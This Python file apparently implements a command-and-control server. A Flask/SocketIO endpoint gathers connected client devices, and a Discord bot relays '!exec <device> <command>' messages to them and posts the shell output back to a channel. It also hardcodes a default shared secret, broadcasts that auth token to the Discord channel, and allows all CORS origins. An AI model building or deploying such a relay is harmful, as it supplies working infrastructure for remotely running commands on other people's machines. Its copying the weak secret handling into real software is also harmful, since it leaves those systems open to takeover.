import os
import asyncio
import threading
import time
import subprocess
from datetime import datetime
from flask import Flask, request, jsonify
from flask_socketio import SocketIO, emit
import discord
from discord.ext import commands

# ================== Fix for audioop ==================
import sys
if not hasattr(sys, 'modules'):
    sys.modules['audioop'] = None

# ================== Environment Variables ==================
DISCORD_TOKEN = os.environ.get('DISCORD_TOKEN')
CHANNEL_ID = int(os.environ.get('CHANNEL_ID', 0))
SERVER_SECRET = os.environ.get('SERVER_SECRET', 'ZWwj6kJb433GKbP')

if not DISCORD_TOKEN or not CHANNEL_ID:
    print("❌ Missing DISCORD_TOKEN or CHANNEL_ID")
    exit(1)

print(f"✅ Loaded: CHANNEL_ID={CHANNEL_ID}")

# ================== Flask Setup ==================
app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'secret')

# ================== SocketIO with Keep-Alive ==================
socketio = SocketIO(
    app,
    cors_allowed_origins="*",
    async_mode='eventlet',
    ping_timeout=60,      # ⬅️ انتظر 60 ثانية قبل قطع الاتصال
    ping_interval=25,     # ⬅️ أرسل ping كل 25 ثانية
    max_http_buffer_size=1000000
)

# ================== Global Variables ==================
connected_clients = {}      # name -> {sid, ip, authenticated}
client_responses = {}       # command_id -> result
failed_attempts = {}        # ip -> count

# ================== WebSocket Events ==================
@socketio.on('connect')
def handle_connect():
    print(f"[+] Client connected: {request.sid}")
    emit('request_auth', {'message': 'Send token'})

@socketio.on('authenticate')
def handle_auth(data):
    token = data.get('token', '')
    name = data.get('name', 'Unknown')
    ip = request.remote_addr

    if token == SERVER_SECRET:
        connected_clients[name] = {
            'sid': request.sid,
            'ip': ip,
            'authenticated': True,
            'connected_at': datetime.now().isoformat()
        }
        print(f"[✅] Authenticated: {name} from {ip}")
        emit('auth_success', {'message': f'Welcome {name}'})
        if ip in failed_attempts:
            del failed_attempts[ip]
    else:
        print(f"[❌] Auth failed: {name} from {ip}")
        failed_attempts[ip] = failed_attempts.get(ip, 0) + 1
        if failed_attempts[ip] >= 5:
            emit('auth_failed', {'message': 'Blocked'})
            request.disconnect()
        else:
            emit('auth_failed', {'message': f'Wrong token ({failed_attempts[ip]}/5)'})

@socketio.on('command_result')
def handle_result(data):
    name = data.get('client_name')
    if name not in connected_clients or not connected_clients[name]['authenticated']:
        return
    cmd_id = data.get('command_id')
    result = data.get('result')
    client_responses[cmd_id] = result
    print(f"[+] Result from {name}")

@socketio.on('disconnect')
def handle_disconnect():
    for name, info in list(connected_clients.items()):
        if info['sid'] == request.sid:
            del connected_clients[name]
            print(f"[-] {name} disconnected")
            break

# ================== Discord Bot ==================
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'[+] Bot online as {bot.user}')
    channel = bot.get_channel(CHANNEL_ID)
    if channel:
        await channel.send("🖥️ **Server Ready!**")
        await channel.send(f"🔑 **Auth Token:** `{SERVER_SECRET}`")

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    if message.channel.id != CHANNEL_ID:
        return

    content = message.content.strip()
    if not content:
        return

    if content.startswith('!exec'):
        parts = content.split(maxsplit=2)
        if len(parts) < 3:
            await message.channel.send("⚠️ Use: `!exec <device> <command>`")
            return

        _, device, cmd = parts
        
        if device not in connected_clients:
            await message.channel.send(f"❌ Device **{device}** not connected")
            return
        if not connected_clients[device]['authenticated']:
            await message.channel.send(f"❌ Device **{device}** not authenticated")
            return

        cmd_id = f"{device}_{datetime.now().timestamp()}"
        sid = connected_clients[device]['sid']
        
        try:
            socketio.emit('execute_command', {
                'command': cmd,
                'command_id': cmd_id
            }, room=sid)
            
            await asyncio.sleep(30)
            result = client_responses.pop(cmd_id, "⏰ Timeout")
            
            if len(result) > 1900:
                result = result[:1900] + "\n... (truncated)"
            
            await message.channel.send(f"💻 **{device}** => `{cmd}`\n```\n{result}\n```")
            
        except Exception as e:
            await message.channel.send(f"❌ Error: {e}")

    elif content == '!list':
        if not connected_clients:
            await message.channel.send("❌ No devices connected")
            return
        devices = "\n".join([f"- {name}" for name in connected_clients])
        await message.channel.send(f"📱 **Connected:**\n{devices}")

    elif content == '!help':
        await message.channel.send("""
**Commands:**
`!list` - Show connected devices
`!exec <device> <command>` - Execute command
**Examples:**
`!exec MY-PC dir`
`!exec MY-PC ipconfig`
        """)

    elif content == '!ping':
        await message.channel.send("🏓 Pong!")

# ================== Routes ==================
@app.route('/')
def index():
    return jsonify({
        'status': 'online',
        'clients': len(connected_clients)
    })

@app.route('/status')
def status():
    return jsonify({
        'clients': list(connected_clients.keys()),
        'total': len(connected_clients)
    })

# ================== Main ==================
if __name__ == '__main__':
    def run_bot():
        try:
            bot.run(DISCORD_TOKEN)
        except Exception as e:
            print(f"❌ Bot error: {e}")

    t = threading.Thread(target=run_bot, daemon=True)
    t.start()
    time.sleep(2)

    port = int(os.environ.get('PORT', 5000))
    socketio.run(
        app,
        host='0.0.0.0',
        port=port,
        debug=False,
        allow_unsafe_werkzeug=True
    )
